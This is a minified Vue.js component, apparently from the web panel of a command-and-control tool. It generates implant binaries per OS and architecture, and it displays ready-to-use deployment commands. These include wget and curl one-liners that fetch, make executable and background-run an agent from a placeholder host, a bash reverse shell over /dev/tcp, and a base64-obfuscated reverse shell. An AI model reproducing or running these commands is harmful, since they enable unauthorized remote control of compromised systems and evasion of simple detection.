import{_ as M}from"./index-88aec585.js";/* empty css               *//* empty css                *//* empty css                     *//* empty css                 *//* empty css               *//* empty css                  */import{C}from"./index-926bd281.js";import{a as u,w as N,x as j,z as A,o as G,A as F,v as D,B as P,C as T}from"./element-61b2a7f7.js";import{H as Z,r as q,_ as b,l as s,m as p,V as a,P as o,p as v,F as x,a8 as h,T as V,O as w,U as E}from"./vue-95bbca75.js";const z={class:"form-container"},Y={class:"command-prompt"},H=Z({__name:"ServerGen",setup(J){const g=q([]),R=async()=>{const n=await C.ShowListener();n.status===200?n.data.status===200?g.value=n.data.data:u.error(n.data.data):u.error("Something wrong")},k=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],O={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},l=b({listener:"",os:"",arch:""}),_=b([]),S=n=>{l.arch="",_.splice(0,_.length,...O[n]||[])},L=async()=>{let n="";try{const t=await C.GenServer({osType:l.os,archType:l.arch,listener:l.listener});if(t.status==200){u.success("导出成功");const c=t.headers["content-disposition"]||"",r=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(c);let m=r&&r.length>1?decodeURIComponent(r[1].replace(/['"]/g,"")):"exported_file",f=new Blob([t.data],{type:t.headers["content-type"]}),d=document.createElement("a"),i=window.URL.createObjectURL(f);d.href=i,d.download=m,document.body.appendChild(d),d.click(),document.body.removeChild(d),window.URL.revokeObjectURL(i)}else u.error("导出失败，请稍后重试")}catch{u.error(`执行命令失败，请检查后端日志 ${n}`)}},U=b([{name:"上线命令",code:"./r_linux_amd64 tNROopcR45q4Z8I1"},{name:"linux wget上线",code:"wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 tNROopcR45q4Z8I1 > m.log 2>&1 &"},{name:"linux curl上线",code:"curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 tNROopcR45q4Z8I1 > m.log 2>&1 &"},{name:"反弹shell",code:"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"},{name:"反弹shell2",code:"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}"}]);return(n,t)=>{const c=D,r=N,m=j,f=A,d=G,i=F,y=P,B=T;return s(),p("div",null,[a(i,{class:"box-card"},{default:o(()=>[v("div",z,[a(f,{model:l,"label-width":"120px"},{default:o(()=>[a(m,{label:"Listener"},{default:o(()=>[a(r,{modelValue:l.listener,"onUpdate:modelValue":t[0]||(t[0]=e=>l.listener=e),placeholder:"选择listener",onVisibleChange:R},{default:o(()=>[(s(!0),p(x,null,h(g.value,e=>(s(),w(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"操作系统"},{default:o(()=>[a(r,{modelValue:l.os,"onUpdate:modelValue":t[1]||(t[1]=e=>l.os=e),placeholder:"选择操作系统",onChange:S},{default:o(()=>[(s(),p(x,null,h(k,e=>a(c,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"架构"},{default:o(()=>[a(r,{modelValue:l.arch,"onUpdate:modelValue":t[2]||(t[2]=e=>l.arch=e),placeholder:"选择架构",disabled:_.length===0},{default:o(()=>[(s(!0),p(x,null,h(_,e=>(s(),w(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1})]),_:1},8,["model"]),a(d,{type:"primary",onClick:L,disabled:!l.os||!l.arch},{default:o(()=>[V(" 生成 ")]),_:1},8,["disabled"])])]),_:1}),v("div",Y,[(s(!0),p(x,null,h(U,(e,I)=>(s(),w(i,{shadow:"hover",key:I,class:"command-item"},{default:o(()=>[a(B,null,{default:o(()=>[a(y,{span:4,class:"command-name"},{default:o(()=>[V(E(e.name),1)]),_:2},1024),a(y,{span:20,class:"command-code"},{default:o(()=>[v("code",null,E(e.code),1)]),_:2},1024)]),_:2},1024)]),_:2},1024))),128))])])}}});const ne=M(H,[["__scopeId","data-v-4cfc24ef"]]);export{ne as default};
